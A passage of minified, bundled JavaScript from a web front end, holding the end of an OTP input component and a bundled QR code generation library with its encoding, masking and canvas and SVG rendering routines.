              @keydown=${e=>this.handleKeyDown(e,t)}
            >
            </wui-input-numeric>
          `))}
      </wui-flex>
    `}handleInput(e,t){const r=e.target,n=this.getInputElement(r);if(n){const r=n.value;"insertFromPaste"===e.inputType?this.handlePaste(n,r,t):Mr.isNumber(r)&&e.data?(n.value=e.data,this.focusInputField("next",t)):n.value=""}}handlePaste(e,t,r){const n=t[0];if(n&&Mr.isNumber(n)){e.value=n;const i=t.substring(1);if(r+1<this.length&&i.length){const e=this.numerics[r+1],t=e?this.getInputElement(e):void 0;t&&this.handlePaste(t,i,r+1)}else this.focusInputField("next",r)}else e.value=""}getInputElement(e){var t;return null!=(t=e.shadowRoot)&&t.querySelector("input")?e.shadowRoot.querySelector("input"):null}};Cg.styles=[Rt,rU],GA([ve({type:Number})],Cg.prototype,"length",void 0),Cg=GA([De("wui-otp")],Cg);var S0={},nU=function(){return"function"==typeof Promise&&Promise.prototype&&Promise.prototype.then},KA={},us={};let P3;const iU=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];us.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||e>40)throw new Error('"version" should be in range from 1 to 40');return 4*e+17},us.getSymbolTotalCodewords=function(e){return iU[e]},us.getBCHDigit=function(e){let t=0;for(;0!==e;)t++,e>>>=1;return t},us.setToSJISFunction=function(e){if("function"!=typeof e)throw new Error('"toSJISFunc" is not a valid function.');P3=e},us.isKanjiModeEnabled=function(){return typeof P3<"u"},us.toSJIS=function(e){return P3(e)};var bv={};function JA(){this.buffer=[],this.length=0}!function(e){e.L={bit:1},e.M={bit:0},e.Q={bit:3},e.H={bit:2},e.isValid=function(e){return e&&typeof e.bit<"u"&&e.bit>=0&&e.bit<4},e.from=function(t,r){if(e.isValid(t))return t;try{return function(t){if("string"!=typeof t)throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return e.L;case"m":case"medium":return e.M;case"q":case"quartile":return e.Q;case"h":case"high":return e.H;default:throw new Error("Unknown EC Level: "+t)}}(t)}catch{return r}}}(bv),JA.prototype={get:function(e){const t=Math.floor(e/8);return 1==(this.buffer[t]>>>7-e%8&1)},put:function(e,t){for(let r=0;r<t;r++)this.putBit(1==(e>>>t-r-1&1))},getLengthInBits:function(){return this.length},putBit:function(e){const t=Math.floor(this.length/8);this.buffer.length<=t&&this.buffer.push(0),e&&(this.buffer[t]|=128>>>this.length%8),this.length++}};var sU=JA;function C0(e){if(!e||e<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=e,this.data=new Uint8Array(e*e),this.reservedBit=new Uint8Array(e*e)}C0.prototype.set=function(e,t,r,n){const i=e*this.size+t;this.data[i]=r,n&&(this.reservedBit[i]=!0)},C0.prototype.get=function(e,t){return this.data[e*this.size+t]},C0.prototype.xor=function(e,t,r){this.data[e*this.size+t]^=r},C0.prototype.isReserved=function(e,t){return this.reservedBit[e*this.size+t]};var oU=C0,ZA={};!function(e){const t=us.getSymbolSize;e.getRowColCoords=function(e){if(1===e)return[];const r=Math.floor(e/7)+2,n=t(e),i=145===n?26:2*Math.ceil((n-13)/(2*r-2)),o=[n-7];for(let e=1;e<r-1;e++)o[e]=o[e-1]-i;return o.push(6),o.reverse()},e.getPositions=function(t){const r=[],n=e.getRowColCoords(t),i=n.length;for(let e=0;e<i;e++)for(let t=0;t<i;t++)0===e&&0===t||0===e&&t===i-1||e===i-1&&0===t||r.push([n[e],n[t]]);return r}}(ZA);var QA={};const aU=us.getSymbolSize,Q6=7;QA.getPositions=function(e){const t=aU(e);return[[0,0],[t-7,0],[0,t-7]]};var YA={};!function(e){e.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const t=3,r=3,n=40,i=10;function o(t,r,n){switch(t){case e.Patterns.PATTERN000:return(r+n)%2==0;case e.Patterns.PATTERN001:return r%2==0;case e.Patterns.PATTERN010:return n%3==0;case e.Patterns.PATTERN011:return(r+n)%3==0;case e.Patterns.PATTERN100:return(Math.floor(r/2)+Math.floor(n/3))%2==0;case e.Patterns.PATTERN101:return r*n%2+r*n%3==0;case e.Patterns.PATTERN110:return(r*n%2+r*n%3)%2==0;case e.Patterns.PATTERN111:return(r*n%3+(r+n)%2)%2==0;default:throw new Error("bad maskPattern:"+t)}}e.isValid=function(e){return null!=e&&""!==e&&!isNaN(e)&&e>=0&&e<=7},e.from=function(t){return e.isValid(t)?parseInt(t,10):void 0},e.getPenaltyN1=function(e){const r=e.size;let n=0,i=0,o=0,s=null,a=null;for(let c=0;c<r;c++){i=o=0,s=a=null;for(let l=0;l<r;l++){let r=e.get(c,l);r===s?i++:(i>=5&&(n+=t+(i-5)),s=r,i=1),r=e.get(l,c),r===a?o++:(o>=5&&(n+=t+(o-5)),a=r,o=1)}i>=5&&(n+=t+(i-5)),o>=5&&(n+=t+(o-5))}return n},e.getPenaltyN2=function(e){const t=e.size;let n=0;for(let r=0;r<t-1;r++)for(let i=0;i<t-1;i++){const t=e.get(r,i)+e.get(r,i+1)+e.get(r+1,i)+e.get(r+1,i+1);(4===t||0===t)&&n++}return n*r},e.getPenaltyN3=function(e){const t=e.size;let r=0,i=0,o=0;for(let n=0;n<t;n++){i=o=0;for(let s=0;s<t;s++)i=i<<1&2047|e.get(n,s),s>=10&&(1488===i||93===i)&&r++,o=o<<1&2047|e.get(s,n),s>=10&&(1488===o||93===o)&&r++}return r*n},e.getPenaltyN4=function(e){let t=0;const r=e.data.length;for(let n=0;n<r;n++)t+=e.data[n];return Math.abs(Math.ceil(100*t/r/5)-10)*i},e.applyMask=function(e,t){const r=t.size;for(let n=0;n<r;n++)for(let i=0;i<r;i++)t.isReserved(i,n)||t.xor(i,n,o(e,i,n))},e.getBestMask=function(t,r){const n=Object.keys(e.Patterns).length;let i=0,o=1/0;for(let s=0;s<n;s++){r(s),e.applyMask(s,t);const n=e.getPenaltyN1(t)+e.getPenaltyN2(t)+e.getPenaltyN3(t)+e.getPenaltyN4(t);e.applyMask(s,t),n<o&&(o=n,i=s)}return i}}(YA);var wv={};const _c=bv,v1=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],m1=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];wv.getBlocksCount=function(e,t){switch(t){case _c.L:return v1[4*(e-1)+0];case _c.M:return v1[4*(e-1)+1];case _c.Q:return v1[4*(e-1)+2];case _c.H:return v1[4*(e-1)+3];default:return}},wv.getTotalCodewordsCount=function(e,t){switch(t){case _c.L:return m1[4*(e-1)+0];case _c.M:return m1[4*(e-1)+1];case _c.Q:return m1[4*(e-1)+2];case _c.H:return m1[4*(e-1)+3];default:return}};var XA={},yv={};const Nd=new Uint8Array(512),Ag=new Uint8Array(256);!function(){let e=1;for(let t=0;t<255;t++)Nd[t]=e,Ag[e]=t,e<<=1,256&e&&(e^=285);for(let e=255;e<512;e++)Nd[e]=Nd[e-255]}(),yv.log=function(e){if(e<1)throw new Error("log("+e+")");return Ag[e]},yv.exp=function(e){return Nd[e]},yv.mul=function(e,t){return 0===e||0===t?0:Nd[Ag[e]+Ag[t]]},function(e){const t=yv;e.mul=function(e,r){const n=new Uint8Array(e.length+r.length-1);for(let i=0;i<e.length;i++)for(let o=0;o<r.length;o++)n[i+o]^=t.mul(e[i],r[o]);return n},e.mod=function(e,r){let n=new Uint8Array(e);for(;n.length-r.length>=0;){const e=n[0];for(let i=0;i<r.length;i++)n[i]^=t.mul(r[i],e);let i=0;for(;i<n.length&&0===n[i];)i++;n=n.slice(i)}return n},e.generateECPolynomial=function(r){let n=new Uint8Array([1]);for(let i=0;i<r;i++)n=e.mul(n,new Uint8Array([1,t.exp(i)]));return n}}(XA);const e9=XA;function M3(e){this.genPoly=void 0,this.degree=e,this.degree&&this.initialize(this.degree)}M3.prototype.initialize=function(e){this.degree=e,this.genPoly=e9.generateECPolynomial(this.degree)},M3.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");const t=new Uint8Array(e.length+this.degree);t.set(e);const r=e9.mod(t,this.genPoly),n=this.degree-r.length;if(n>0){const e=new Uint8Array(this.degree);return e.set(r,n),e}return r};var cU=M3,t9={},Hc={},k3={isValid:function(e){return!isNaN(e)&&e>=1&&e<=40}},aa={};const r9="[0-9]+",lU="[A-Z $%*+\\-./:]+";let t0="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";t0=t0.replace(/u/g,"\\u");const uU="(?:(?![A-Z0-9 $%*+\\-./:]|"+t0+")(?:.|[\r\n]))+";aa.KANJI=new RegExp(t0,"g"),aa.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),aa.BYTE=new RegExp(uU,"g"),aa.NUMERIC=new RegExp(r9,"g"),aa.ALPHANUMERIC=new RegExp(lU,"g");const fU=new RegExp("^"+t0+"$"),hU=new RegExp("^[0-9]+$"),dU=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");aa.testKanji=function(e){return fU.test(e)},aa.testNumeric=function(e){return hU.test(e)},aa.testAlphanumeric=function(e){return dU.test(e)},function(e){const t=k3,r=aa;e.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},e.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},e.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},e.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},e.MIXED={bit:-1},e.getCharCountIndicator=function(e,r){if(!e.ccBits)throw new Error("Invalid mode: "+e);if(!t.isValid(r))throw new Error("Invalid version: "+r);return r>=1&&r<10?e.ccBits[0]:r<27?e.ccBits[1]:e.ccBits[2]},e.getBestModeForData=function(t){return r.testNumeric(t)?e.NUMERIC:r.testAlphanumeric(t)?e.ALPHANUMERIC:r.testKanji(t)?e.KANJI:e.BYTE},e.toString=function(e){if(e&&e.id)return e.id;throw new Error("Invalid mode")},e.isValid=function(e){return e&&e.bit&&e.ccBits},e.from=function(t,r){if(e.isValid(t))return t;try{return function(t){if("string"!=typeof t)throw new Error("Param is not a string");switch(t.toLowerCase()){case"numeric":return e.NUMERIC;case"alphanumeric":return e.ALPHANUMERIC;case"kanji":return e.KANJI;case"byte":return e.BYTE;default:throw new Error("Unknown mode: "+t)}}(t)}catch{return r}}}(Hc),function(e){const t=us,r=wv,n=bv,i=Hc,o=k3,s=t.getBCHDigit(7973);function a(e,t){return i.getCharCountIndicator(e,t)+4}function c(e,t){let r=0;return e.forEach((function(e){const n=a(e.mode,t);r+=n+e.getBitsLength()})),r}e.from=function(e,t){return o.isValid(e)?parseInt(e,10):t},e.getCapacity=function(e,n,s){if(!o.isValid(e))throw new Error("Invalid QR Code version");typeof s>"u"&&(s=i.BYTE);const c=8*(t.getSymbolTotalCodewords(e)-r.getTotalCodewordsCount(e,n));if(s===i.MIXED)return c;const l=c-a(s,e);switch(s){case i.NUMERIC:return Math.floor(l/10*3);case i.ALPHANUMERIC:return Math.floor(l/11*2);case i.KANJI:return Math.floor(l/13);case i.BYTE:default:return Math.floor(l/8)}},e.getBestVersionForData=function(t,r){let o;const s=n.from(r,n.M);if(Array.isArray(t)){if(t.length>1)return function(t,r){for(let n=1;n<=40;n++)if(c(t,n)<=e.getCapacity(n,r,i.MIXED))return n}(t,s);if(0===t.length)return 1;o=t[0]}else o=t;return function(t,r,n){for(let i=1;i<=40;i++)if(r<=e.getCapacity(i,n,t))return i}(o.mode,o.getLength(),s)},e.getEncodedBits=function(e){if(!o.isValid(e)||e<7)throw new Error("Invalid QR Code version");let r=e<<12;for(;t.getBCHDigit(r)-s>=0;)r^=7973<<t.getBCHDigit(r)-s;return e<<12|r}}(t9);var n9={};const t2=us,i9=1335,pU=21522,Y6=t2.getBCHDigit(i9);n9.getEncodedBits=function(e,t){const r=e.bit<<3|t;let n=r<<10;for(;t2.getBCHDigit(n)-Y6>=0;)n^=i9<<t2.getBCHDigit(n)-Y6;return(r<<10|n)^pU};var s9={};const gU=Hc;function If(e){this.mode=gU.NUMERIC,this.data=e.toString()}If.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)},If.prototype.getLength=function(){return this.data.length},If.prototype.getBitsLength=function(){return If.getBitsLength(this.data.length)},If.prototype.write=function(e){let t,r,n;for(t=0;t+3<=this.data.length;t+=3)r=this.data.substr(t,3),n=parseInt(r,10),e.put(n,10);const i=this.data.length-t;i>0&&(r=this.data.substr(t),n=parseInt(r,10),e.put(n,3*i+1))};var vU=If;const mU=Hc,gw=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function Rf(e){this.mode=mU.ALPHANUMERIC,this.data=e}Rf.getBitsLength=function(e){return 11*Math.floor(e/2)+e%2*6},Rf.prototype.getLength=function(){return this.data.length},Rf.prototype.getBitsLength=function(){return Rf.getBitsLength(this.data.length)},Rf.prototype.write=function(e){let t;for(t=0;t+2<=this.data.length;t+=2){let r=45*gw.indexOf(this.data[t]);r+=gw.indexOf(this.data[t+1]),e.put(r,11)}this.data.length%2&&e.put(gw.indexOf(this.data[t]),6)};var bU=Rf,wU=function(e){for(var t=[],r=e.length,n=0;n<r;n++){var i=e.charCodeAt(n);if(i>=55296&&i<=56319&&r>n+1){var o=e.charCodeAt(n+1);o>=56320&&o<=57343&&(i=1024*(i-55296)+o-56320+65536,n+=1)}i<128?t.push(i):i<2048?(t.push(i>>6|192),t.push(63&i|128)):i<55296||i>=57344&&i<65536?(t.push(i>>12|224),t.push(i>>6&63|128),t.push(63&i|128)):i>=65536&&i<=1114111?(t.push(i>>18|240),t.push(i>>12&63|128),t.push(i>>6&63|128),t.push(63&i|128)):t.push(239,191,189)}return new Uint8Array(t).buffer};const yU=wU,_U=Hc;function Tf(e){this.mode=_U.BYTE,"string"==typeof e&&(e=yU(e)),this.data=new Uint8Array(e)}Tf.getBitsLength=function(e){return 8*e},Tf.prototype.getLength=function(){return this.data.length},Tf.prototype.getBitsLength=function(){return Tf.getBitsLength(this.data.length)},Tf.prototype.write=function(e){for(let t=0,r=this.data.length;t<r;t++)e.put(this.data[t],8)};var EU=Tf;const xU=Hc,SU=us;function Nf(e){this.mode=xU.KANJI,this.data=e}Nf.getBitsLength=function(e){return 13*e},Nf.prototype.getLength=function(){return this.data.length},Nf.prototype.getBitsLength=function(){return Nf.getBitsLength(this.data.length)},Nf.prototype.write=function(e){let t;for(t=0;t<this.data.length;t++){let r=SU.toSJIS(this.data[t]);if(r>=33088&&r<=40956)r-=33088;else{if(!(r>=57408&&r<=60351))throw new Error("Invalid SJIS character: "+this.data[t]+"\nMake sure your charset is UTF-8");r-=49472}r=192*(r>>>8&255)+(255&r),e.put(r,13)}};var CU=Nf,o9={exports:{}};!function(e){var t={single_source_shortest_paths:function(e,r,n){var i={},o={};o[r]=0;var s,a,c,l,u,h,d,f=t.PriorityQueue.make();for(f.push(r,0);!f.empty();)for(c in a=(s=f.pop()).value,l=s.cost,u=e[a]||{})u.hasOwnProperty(c)&&(h=l+u[c],d=o[c],(typeof o[c]>"u"||d>h)&&(o[c]=h,f.push(c,h),i[c]=a));if(typeof n<"u"&&typeof o[n]>"u"){var p=["Could not find a path from ",r," to ",n,"."].join("");throw new Error(p)}return i},extract_shortest_path_from_predecessor_list:function(e,t){for(var r=[],n=t;n;)r.push(n),e[n],n=e[n];return r.reverse(),r},find_path:function(e,r,n){var i=t.single_source_shortest_paths(e,r,n);return t.extract_shortest_path_from_predecessor_list(i,n)},PriorityQueue:{make:function(e){var r,n=t.PriorityQueue,i={};for(r in e=e||{},n)n.hasOwnProperty(r)&&(i[r]=n[r]);return i.queue=[],i.sorter=e.sorter||n.default_sorter,i},default_sorter:function(e,t){return e.cost-t.cost},push:function(e,t){var r={value:e,cost:t};this.queue.push(r),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return 0===this.queue.length}}};o9.exports=t}();var AU=o9.exports;!function(e){const t=Hc,r=vU,n=bU,i=EU,o=CU,s=aa,a=us,c=AU;function l(e){return unescape(encodeURIComponent(e)).length}function u(e,t,r){const n=[];let i;for(;null!==(i=e.exec(r));)n.push({data:i[0],index:i.index,mode:t,length:i[0].length});return n}function h(e){const r=u(s.NUMERIC,t.NUMERIC,e),n=u(s.ALPHANUMERIC,t.ALPHANUMERIC,e);let i,o;return a.isKanjiModeEnabled()?(i=u(s.BYTE,t.BYTE,e),o=u(s.KANJI,t.KANJI,e)):(i=u(s.BYTE_KANJI,t.BYTE,e),o=[]),r.concat(n,i,o).sort((function(e,t){return e.index-t.index})).map((function(e){return{data:e.data,mode:e.mode,length:e.length}}))}function d(e,s){switch(s){case t.NUMERIC:return r.getBitsLength(e);case t.ALPHANUMERIC:return n.getBitsLength(e);case t.KANJI:return o.getBitsLength(e);case t.BYTE:return i.getBitsLength(e)}}function f(e,s){let c;const l=t.getBestModeForData(e);if(c=t.from(s,l),c!==t.BYTE&&c.bit<l.bit)throw new Error('"'+e+'" cannot be encoded with mode '+t.toString(c)+".\n Suggested mode is: "+t.toString(l));switch(c===t.KANJI&&!a.isKanjiModeEnabled()&&(c=t.BYTE),c){case t.NUMERIC:return new r(e);case t.ALPHANUMERIC:return new n(e);case t.KANJI:return new o(e);case t.BYTE:return new i(e)}}e.fromArray=function(e){return e.reduce((function(e,t){return"string"==typeof t?e.push(f(t,null)):t.data&&e.push(f(t.data,t.mode)),e}),[])},e.fromString=function(r,n){const i=function(e){const r=[];for(let n=0;n<e.length;n++){const i=e[n];switch(i.mode){case t.NUMERIC:r.push([i,{data:i.data,mode:t.ALPHANUMERIC,length:i.length},{data:i.data,mode:t.BYTE,length:i.length}]);break;case t.ALPHANUMERIC:r.push([i,{data:i.data,mode:t.BYTE,length:i.length}]);break;case t.KANJI:r.push([i,{data:i.data,mode:t.BYTE,length:l(i.data)}]);break;case t.BYTE:r.push([{data:i.data,mode:t.BYTE,length:l(i.data)}])}}return r}(h(r,a.isKanjiModeEnabled())),o=function(e,r){const n={},i={start:{}};let o=["start"];for(let s=0;s<e.length;s++){const a=e[s],c=[];for(let e=0;e<a.length;e++){const l=a[e],u=""+s+e;c.push(u),n[u]={node:l,lastCount:0},i[u]={};for(let e=0;e<o.length;e++){const s=o[e];n[s]&&n[s].node.mode===l.mode?(i[s][u]=d(n[s].lastCount+l.length,l.mode)-d(n[s].lastCount,l.mode),n[s].lastCount+=l.length):(n[s]&&(n[s].lastCount=l.length),i[s][u]=d(l.length,l.mode)+4+t.getCharCountIndicator(l.mode,r))}}o=c}for(let e=0;e<o.length;e++)i[o[e]].end=0;return{map:i,table:n}}(i,n),s=c.find_path(o.map,"start","end"),u=[];for(let e=1;e<s.length-1;e++)u.push(o.table[s[e]].node);return e.fromArray(function(e){return e.reduce((function(e,t){const r=e.length-1>=0?e[e.length-1]:null;return r&&r.mode===t.mode?(e[e.length-1].data+=t.data,e):(e.push(t),e)}),[])}(u))},e.rawSplit=function(t){return e.fromArray(h(t,a.isKanjiModeEnabled()))}}(s9);const _v=us,vw=bv,IU=sU,RU=oU,TU=ZA,NU=QA,r2=YA,n2=wv,OU=cU,Ig=t9,PU=n9,MU=Hc,mw=s9;function kU(e,t){const r=e.size,n=NU.getPositions(t);for(let t=0;t<n.length;t++){const i=n[t][0],o=n[t][1];for(let t=-1;t<=7;t++)if(!(i+t<=-1||r<=i+t))for(let n=-1;n<=7;n++)o+n<=-1||r<=o+n||(t>=0&&t<=6&&(0===n||6===n)||n>=0&&n<=6&&(0===t||6===t)||t>=2&&t<=4&&n>=2&&n<=4?e.set(i+t,o+n,!0,!0):e.set(i+t,o+n,!1,!0))}}function DU(e){const t=e.size;for(let r=8;r<t-8;r++){const t=r%2==0;e.set(r,6,t,!0),e.set(6,r,t,!0)}}function $U(e,t){const r=TU.getPositions(t);for(let t=0;t<r.length;t++){const n=r[t][0],i=r[t][1];for(let t=-2;t<=2;t++)for(let r=-2;r<=2;r++)-2===t||2===t||-2===r||2===r||0===t&&0===r?e.set(n+t,i+r,!0,!0):e.set(n+t,i+r,!1,!0)}}function LU(e,t){const r=e.size,n=Ig.getEncodedBits(t);let i,o,s;for(let t=0;t<18;t++)i=Math.floor(t/3),o=t%3+r-8-3,s=1==(n>>t&1),e.set(i,o,s,!0),e.set(o,i,s,!0)}function bw(e,t,r){const n=e.size,i=PU.getEncodedBits(t,r);let o,s;for(o=0;o<15;o++)s=1==(i>>o&1),o<6?e.set(o,8,s,!0):o<8?e.set(o+1,8,s,!0):e.set(n-15+o,8,s,!0),o<8?e.set(8,n-o-1,s,!0):o<9?e.set(8,15-o-1+1,s,!0):e.set(8,15-o-1,s,!0);e.set(n-8,8,1,!0)}function BU(e,t){const r=e.size;let n=-1,i=r-1,o=7,s=0;for(let a=r-1;a>0;a-=2)for(6===a&&a--;;){for(let r=0;r<2;r++)if(!e.isReserved(i,a-r)){let n=!1;s<t.length&&(n=1==(t[s]>>>o&1)),e.set(i,a-r,n),o--,-1===o&&(s++,o=7)}if(i+=n,i<0||r<=i){i-=n,n=-n;break}}}function FU(e,t,r){const n=new IU;r.forEach((function(t){n.put(t.mode.bit,4),n.put(t.getLength(),MU.getCharCountIndicator(t.mode,e)),t.write(n)}));const i=8*(_v.getSymbolTotalCodewords(e)-n2.getTotalCodewordsCount(e,t));for(n.getLengthInBits()+4<=i&&n.put(0,4);n.getLengthInBits()%8!=0;)n.putBit(0);const o=(i-n.getLengthInBits())/8;for(let e=0;e<o;e++)n.put(e%2?17:236,8);return jU(n,e,t)}function jU(e,t,r){const n=_v.getSymbolTotalCodewords(t),i=n-n2.getTotalCodewordsCount(t,r),o=n2.getBlocksCount(t,r),s=o-n%o,a=Math.floor(n/o),c=Math.floor(i/o),l=c+1,u=a-c,h=new OU(u);let d=0;const f=new Array(o),p=new Array(o);let g=0;const m=new Uint8Array(e.buffer);for(let e=0;e<o;e++){const t=e<s?c:l;f[e]=m.slice(d,d+t),p[e]=h.encode(f[e]),d+=t,g=Math.max(g,t)}const v=new Uint8Array(n);let y,b,w=0;for(y=0;y<g;y++)for(b=0;b<o;b++)y<f[b].length&&(v[w++]=f[b][y]);for(y=0;y<u;y++)for(b=0;b<o;b++)v[w++]=p[b][y];return v}function UU(e,t,r,n){let i;if(Array.isArray(e))i=mw.fromArray(e);else{if("string"!=typeof e)throw new Error("Invalid data");{let n=t;if(!n){const t=mw.rawSplit(e);n=Ig.getBestVersionForData(t,r)}i=mw.fromString(e,n||40)}}const o=Ig.getBestVersionForData(i,r);if(!o)throw new Error("The amount of data is too big to be stored in a QR Code");if(t){if(t<o)throw new Error("\nThe chosen QR Code version cannot contain this amount of data.\nMinimum version required to store current data is: "+o+".\n")}else t=o;const s=FU(t,r,i),a=_v.getSymbolSize(t),c=new RU(a);return kU(c,t),DU(c),$U(c,t),bw(c,r,0),t>=7&&LU(c,t),BU(c,s),isNaN(n)&&(n=r2.getBestMask(c,bw.bind(null,c,r))),r2.applyMask(n,c),bw(c,r,n),{modules:c,version:t,errorCorrectionLevel:r,maskPattern:n,segments:i}}KA.create=function(e,t){if(typeof e>"u"||""===e)throw new Error("No input text");let r,n,i=vw.M;return typeof t<"u"&&(i=vw.from(t.errorCorrectionLevel,vw.M),r=Ig.from(t.version),n=r2.from(t.maskPattern),t.toSJISFunc&&_v.setToSJISFunction(t.toSJISFunc)),UU(e,r,i,n)};var a9={},D3={};!function(e){function t(e){if("number"==typeof e&&(e=e.toString()),"string"!=typeof e)throw new Error("Color should be defined as hex string");let t=e.slice().replace("#","").split("");if(t.length<3||5===t.length||t.length>8)throw new Error("Invalid hex color: "+e);(3===t.length||4===t.length)&&(t=Array.prototype.concat.apply([],t.map((function(e){return[e,e]})))),6===t.length&&t.push("F","F");const r=parseInt(t.join(""),16);return{r:r>>24&255,g:r>>16&255,b:r>>8&255,a:255&r,hex:"#"+t.slice(0,6).join("")}}e.getOptions=function(e){e||(e={}),e.color||(e.color={});const r=typeof e.margin>"u"||null===e.margin||e.margin<0?4:e.margin,n=e.width&&e.width>=21?e.width:void 0,i=e.scale||4;return{width:n,scale:n?4:i,margin:r,color:{dark:t(e.color.dark||"#000000ff"),light:t(e.color.light||"#ffffffff")},type:e.type,rendererOpts:e.rendererOpts||{}}},e.getScale=function(e,t){return t.width&&t.width>=e+2*t.margin?t.width/(e+2*t.margin):t.scale},e.getImageWidth=function(t,r){const n=e.getScale(t,r);return Math.floor((t+2*r.margin)*n)},e.qrToImageData=function(t,r,n){const i=r.modules.size,o=r.modules.data,s=e.getScale(i,n),a=Math.floor((i+2*n.margin)*s),c=n.margin*s,l=[n.color.light,n.color.dark];for(let e=0;e<a;e++)for(let r=0;r<a;r++){let u=4*(e*a+r),h=n.color.light;if(e>=c&&r>=c&&e<a-c&&r<a-c){h=l[o[Math.floor((e-c)/s)*i+Math.floor((r-c)/s)]?1:0]}t[u++]=h.r,t[u++]=h.g,t[u++]=h.b,t[u]=h.a}}}(D3),function(e){const t=D3;e.render=function(e,r,n){let i=n,o=r;typeof i>"u"&&(!r||!r.getContext)&&(i=r,r=void 0),r||(o=function(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}()),i=t.getOptions(i);const s=t.getImageWidth(e.modules.size,i),a=o.getContext("2d"),c=a.createImageData(s,s);return t.qrToImageData(c.data,e,i),function(e,t,r){e.clearRect(0,0,t.width,t.height),t.style||(t.style={}),t.height=r,t.width=r,t.style.height=r+"px",t.style.width=r+"px"}(a,o,s),a.putImageData(c,0,0),o},e.renderToDataURL=function(t,r,n){let i=n;typeof i>"u"&&(!r||!r.getContext)&&(i=r,r=void 0),i||(i={});const o=e.render(t,r,i),s=i.type||"image/png",a=i.rendererOpts||{};return o.toDataURL(s,a.quality)}}(a9);var c9={};const WU=D3;function X6(e,t){const r=e.a/255,n=t+'="'+e.hex+'"';return r<1?n+" "+t+'-opacity="'+r.toFixed(2).slice(1)+'"':n}function ww(e,t,r){let n=e+t;return typeof r<"u"&&(n+=" "+r),n}function zU(e,t,r){let n="",i=0,o=!1,s=0;for(let a=0;a<e.length;a++){const c=Math.floor(a%t),l=Math.floor(a/t);!c&&!o&&(o=!0),e[a]?(s++,a>0&&c>0&&e[a-1]||(n+=o?ww("M",c+r,.5+l+r):ww("m",i,0),i=0,o=!1),c+1<t&&e[a+1]||(n+=ww("h",s),s=0)):i++}return n}c9.render=function(e,t,r){const n=WU.getOptions(t),i=e.modules.size,o=e.modules.data,s=i+2*n.margin,a=n.color.light.a?"<path "+X6(n.color.light,"fill")+' d="M0 0h'+s+"v"+s+'H0z"/>':"",c="<path "+X6(n.color.dark,"stroke")+' d="'+zU(o,i,n.margin)+'"/>',l='viewBox="0 0 '+s+" "+s+'"',u='<svg xmlns="http://www.w3.org/2000/svg" '+(n.width?'width="'+n.width+'" height="'+n.width+'" ':"")+l+' shape-rendering="crispEdges">'+a+c+"</svg>\n";return"function"==typeof r&&r(null,u),u};const HU=nU,i2=KA,l9=a9,qU=c9;function $3(e,t,r,n,i){const o=[].slice.call(arguments,1),s=o.length,a="function"==typeof o[s-1];if(!a&&!HU())throw new Error("Callback required as last argument");if(!a){if(s<1)throw new Error("Too few arguments provided");return 1===s?(r=t,t=n=void 0):2===s&&!t.getContext&&(n=r,r=t,t=void 0),new Promise((function(i,o){try{const o=i2.create(r,n);i(e(o,t,n))}catch(e){o(e)}}))}if(s<2)throw new Error("Too few arguments provided");2===s?(i=r,r=t,t=n=void 0):3===s&&(t.getContext&&typeof i>"u"?(i=n,n=void 0):(i=n,n=r,r=t,t=void 0));try{const o=i2.create(r,n);i(null,e(o,t,n))}catch(e){i(e)}}S0.create=i2.create,S0.toCanvas=$3.bind(null,l9.render),S0.toDataURL=$3.bind(null,l9.renderToDataURL),S0.toString=$3.bind(null,(function(e,t,r){return qU.render(e,r)}));const VU=.1,eE=2.5,Ea=7;function yw(e,t,r){return e!==t&&(e-t<0?t-e:e-t)<=r+VU}function GU(e,t){const 